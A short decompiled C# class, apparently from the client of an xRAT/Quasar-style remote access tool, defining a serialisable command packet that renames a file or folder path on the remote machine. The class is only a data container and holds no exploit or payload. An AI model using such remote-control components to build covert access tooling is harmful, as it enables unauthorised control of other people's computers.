using System;

namespace xClient.Core.Packets.ServerPackets;

[Serializable]
public class DoPathRename : GInterface4
{
	public string Path { get; set; }

	public string NewPath { get; set; }

	public GEnum1 PathType { get; set; }

	public DoPathRename()
	{
	}

	public DoPathRename(string path, string newpath, GEnum1 pathtype)
	{
		Path = path;
		NewPath = newpath;
		PathType = pathtype;
	}

	public void Execute(GClass33 client)
	{
		client.method_7(this);
	}
}
